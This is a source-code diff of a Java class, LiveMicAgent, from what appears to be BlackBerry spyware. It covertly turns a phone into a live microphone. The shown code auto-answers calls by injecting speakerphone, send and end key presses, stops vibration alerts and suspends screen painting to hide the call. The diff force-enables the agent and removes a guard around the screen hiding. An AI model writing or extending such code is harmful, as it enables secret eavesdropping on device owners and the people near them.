@@ -10,13 +10,7 @@
 package blackberry.agent;
 
 import java.io.EOFException;
-import java.util.Date;
 import java.util.Hashtable;
-import java.util.Timer;
-
-import javax.microedition.media.Manager;
-import javax.microedition.media.Player;
-import javax.microedition.media.control.ToneControl;
 
 import net.rim.blackberry.api.phone.Phone;
 import net.rim.blackberry.api.phone.PhoneCall;
@@ -26,13 +20,11 @@ import net.rim.blackberry.api.phone.phonelogs.PhoneCallLog;
 import net.rim.blackberry.api.phone.phonelogs.PhoneLogs;
 import net.rim.device.api.system.Alert;
 import net.rim.device.api.system.Application;
-import net.rim.device.api.system.Audio;
 import net.rim.device.api.system.Backlight;
 import net.rim.device.api.system.DeviceInfo;
 import net.rim.device.api.ui.Keypad;
 import net.rim.device.api.ui.UiApplication;
 import net.rim.device.api.util.DataBuffer;
-import blackberry.AgentManager;
 import blackberry.AppListener;
 import blackberry.config.Conf;
 import blackberry.debug.Debug;
@@ -43,8 +35,6 @@ import blackberry.fs.Path;
 import blackberry.injection.KeyInjector;
 import blackberry.injection.MenuWalker;
 import blackberry.interfaces.BacklightObserver;
-import blackberry.interfaces.CallListObserver;
-import blackberry.interfaces.PhoneCallObserver;
 import blackberry.utils.Check;
 import blackberry.utils.Utils;
 import blackberry.utils.WChar;
@@ -70,7 +60,7 @@ public class LiveMicAgent extends Agent implements BacklightObserver,
     boolean autoanswer;
     //boolean suspended;
     boolean backlight;
-
+    
     /**
      * Instantiates a new live mic agent.
      * 
@@ -82,8 +72,8 @@ public class LiveMicAgent extends Agent implements BacklightObserver,
         super(Agent.AGENT_LIVE_MIC, agentEnabled, Conf.AGENT_LIVEMIC_ON_SD,
                 "LiveMicAgent");
 
-        //#ifndef LIVE_MIC_ENABLED
-        enable(false);
+        //#ifdef LIVE_MIC_FORCED
+        enable(true);
         //#endif
 
         //#ifdef DBC
@@ -172,7 +162,7 @@ public class LiveMicAgent extends Agent implements BacklightObserver,
         //#endif
 
         Alert.stopVibrate();
-        KeyInjector.pressKey(Keypad.KEY_SPEAKERPHONE);
+        KeyInjector.pressKeyCode(Keypad.KEY_SPEAKERPHONE);
         /*Alert.mute(true);
         Audio.setVolume(0);
         Alert.setVolume(0);
@@ -373,9 +363,9 @@ public class LiveMicAgent extends Agent implements BacklightObserver,
         stopAudio();
 
         if (DeviceInfo.getIdleTime() > MINIMUM_IDLE_TIME) {
-            KeyInjector.pressKey(Keypad.KEY_SEND);
+            KeyInjector.pressKeyCode(Keypad.KEY_SEND);
         } else {
-            KeyInjector.pressKey(Keypad.KEY_END);
+            KeyInjector.pressKeyCode(Keypad.KEY_END);
         }
 
         suspendPainting(true);
@@ -401,7 +391,7 @@ public class LiveMicAgent extends Agent implements BacklightObserver,
             //#endif
             suspendPainting(true);
 
-            KeyInjector.pressKey(Keypad.KEY_END);
+            KeyInjector.pressKeyCode(Keypad.KEY_END);
             //Utils.sleep(2000);
 
             suspendPainting(false);
@@ -438,9 +428,9 @@ public class LiveMicAgent extends Agent implements BacklightObserver,
                     .isPaintingSuspended();
             if (suspended != suspend) {
                 try {
-                    //#ifdef LIVE_MIC_ENABLED
+                    
                     UiApplication.getUiApplication().suspendPainting(suspend);
-                    //#endif
+
                 } catch (final IllegalStateException ex) {
                     //#ifdef DEBUG
                     debug.error(ex);
@@ -485,7 +475,6 @@ public class LiveMicAgent extends Agent implements BacklightObserver,
     Hashtable callingHistory = new Hashtable();
 
     public void callAdded(int arg0) {
-        // TODO Auto-generated method stub
 
     }
 
@@ -500,7 +489,6 @@ public class LiveMicAgent extends Agent implements BacklightObserver,
     }
 
     public void callConferenceCallEstablished(int arg0) {
-        // TODO Auto-generated method stub
 
     }
 
@@ -514,12 +502,10 @@ public class LiveMicAgent extends Agent implements BacklightObserver,
     }
 
     public void callDirectConnectConnected(int arg0) {
-        // TODO Auto-generated method stub
 
     }
 
     public void callDirectConnectDisconnected(int arg0) {
-        // TODO Auto-generated method stub
 
     }
 
@@ -549,17 +535,14 @@ public class LiveMicAgent extends Agent implements BacklightObserver,
     }
 
     public void callEndedByUser(int arg0) {
-        // TODO Auto-generated method stub
 
     }
 
     public void callFailed(int arg0, int arg1) {
-        // TODO Auto-generated method stub
 
     }
 
     public void callHeld(int arg0) {
-        // TODO Auto-generated method stub
 
     }
 
@@ -589,22 +572,18 @@ public class LiveMicAgent extends Agent implements BacklightObserver,
     }
 
     public void callRemoved(int arg0) {
-        // TODO Auto-generated method stub
 
     }
 
     public void callResumed(int arg0) {
-        // TODO Auto-generated method stub
 
     }
 
     public void callWaiting(int arg0) {
-        // TODO Auto-generated method stub
 
     }
 
     public void conferenceCallDisconnected(int arg0) {
-        // TODO Auto-generated method stub
 
     }
 
